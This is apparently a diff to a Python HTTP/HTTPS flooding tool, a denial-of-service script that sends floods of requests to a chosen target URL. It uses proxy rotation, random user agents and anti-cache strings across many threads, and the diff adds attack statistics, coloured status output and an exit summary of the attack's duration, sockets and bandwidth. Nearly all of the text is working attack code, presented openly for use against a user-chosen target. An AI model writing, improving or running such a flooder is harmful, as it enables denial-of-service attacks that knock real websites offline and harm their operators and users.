@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
-#Beta Version: 2.0
+#Beta Version: 2.1
 from random_user_agent.user_agent import UserAgent
 import threading
 import argparse
 import logging
 import random
+import atexit
 import socket
 import socks
 import time
 import ssl
 import sys
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument("url", nargs="?", type=str, help="Target URL. Format: \"http(s)://example.com/path/index.php?param1=param1_value&param2=param2_value\"")
@@ -158,12 +160,20 @@ else:
 
 proxies_length = len(proxies)
 
-print(f"[---] Attack Information [---]\r\nProtocol: {protocol}\r\nURL: {url}\r\n{url_ip}Port: {port}\r\nPath: {path}\r\nParameters: {parameters_str}\r\nMethod: {method}\r\nProxy List: {proxy_list}\r\nProxy Type: {proxy_type_str}\r\nProxies: {proxies_length}\r\nTimeout: {timeout}\r\nMax Thread: {max_threads}\r\nDebug: {debug}\r\n")
+#You can uncomment this if you want.
+#print(f"[---] Attack Information [---]\r\nProtocol: {protocol}\r\nURL: {url}\r\n{url_ip}Port: {port}\r\nPath: {path}\r\nParameters: {parameters_str}\r\nMethod: {method}\r\nProxy List: {proxy_list}\r\nProxy Type: {proxy_type_str}\r\nProxies: {proxies_length}\r\nTimeout: {timeout}\r\nMax Thread: {max_threads}\r\nDebug: {debug}\r\n")
 
 try:
     input("Press enter to initialize the attack.")
 except KeyboardInterrupt:
     sys.exit()
+
+if sys.platform == "linux":
+    os.system("clear")
+elif sys.platform == "win32":
+    os.system("cls")
+
+logger.info("Initializing components...")
 
 active_threads = 0
 usera = UserAgent()
@@ -171,12 +181,21 @@ chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
 chars_list = list(chars)
 hrs = 0
 Bps = 0
+total_hrs = 0
+total_Bps = 0
+total_socks_used = 0
+initial_attack_time = 0
+
+logger.info("Done!")
 
 def HTTPS(host, port, proxy_host, proxy_port):
     try:
         global active_threads
         global hrs
         global Bps
+        global total_hrs
+        global total_Bps
+        global total_socks_used
         active_threads += 1
         port = int(port)
         proxy_port = int(port)
@@ -184,6 +203,7 @@ def HTTPS(host, port, proxy_host, proxy_port):
         sock = socks.socksocket()
         sock.settimeout(timeout)
         sock.connect((host, port))
+        total_socks_used += 1
         context = ssl.create_default_context()
         sock = context.wrap_socket(sock, server_hostname=host)
         for _ in range(rp):
@@ -194,6 +214,8 @@ def HTTPS(host, port, proxy_host, proxy_port):
             sent_bytes = sock.send(http.encode())
             Bps += sent_bytes
             hrs += 1
+            total_hrs += 1
+            total_Bps += sent_bytes
     except Exception as e:
         logger.debug(f"HTTPS Error: {e}")
         pass
@@ -205,12 +227,16 @@ def HTTP(host, port, proxy_host, proxy_port):
         global active_threads
         global hrs
         global Bps
+        global total_hrs
+        global total_Bps
+        global total_socks_used
         active_threads += 1
         port = int(port)
         proxy_port = int(proxy_port)
         rp = int(rpp)
         sock = socks.socksocket()
         sock.connect((host, port))
+        total_socks_used += 1
         while True:
             anti_cache_list = random.choices(chars_list, k=77)
             anti_cache = "".join(anti_cache_list)
@@ -219,6 +245,8 @@ def HTTP(host, port, proxy_host, proxy_port):
             sent_bytes = sock.send(http.encode())
             Bps += sent_bytes
             hrs += 1
+            total_hrs += 1
+            total_Bps += sent_bytes
     except Exception as e:
         logger.debug(f"HTTP Error: {e}")
         pass
@@ -232,7 +260,7 @@ def verbose_status():
         separator = " " * 6
         while True:
             time.sleep(1)
-            print(f"Threads: {active_threads} {separator[len(str(active_threads)):]} HR/s: {hrs} {separator[len(str(hrs)):]} kB/s: {Bps / 1000:.2f}")
+            print(f"Threads: \u001b[32;1m{active_threads}\u001b[0;0m {separator[len(str(active_threads)):]} HR/s: \u001b[32;1m{hrs}\u001b[0;0m {separator[len(str(hrs)):]} kB/s: \u001b[32;1m{Bps / 1000:.2f}\u001b[0;0m")
             hrs = 0
             Bps = 0
     except Exception as e:
@@ -241,7 +269,9 @@ def verbose_status():
 
 def main():
     try:
-        logger.info("Initializing attack...")        
+        global initial_attack_time
+        initial_attack_time = time.time()
+        logger.info("Initializing attack...\r\n")        
         threading.Thread(target=verbose_status, daemon=True).start()
         while True:
             for proxy in proxies:
@@ -257,6 +287,15 @@ def main():
         sys.exit()
     except KeyboardInterrupt:
         sys.exit()
+
+def onexit():
+    try:
+        logging.info("\r\nAttack finished\r\n")
+        print(f"Duration: \u001b[32;1m{(time.time() - initial_attack_time):.2f} seconds\u001b[0;0m\r\nTotal Socks: \u001b[32;1m{total_socks_used}\u001b[0;0m\r\nTotal HTTP: \u001b[32;1m{total_hrs}\u001b[0;0m\r\nTotal Bandwidth: \u001b[32;1m{(total_Bps / 1000):.2f} kB\u001b[0;0m\r\n")
+    except Exception:
+        pass
+
+atexit.register(onexit)
 
 if __name__ == "__main__":
     main()
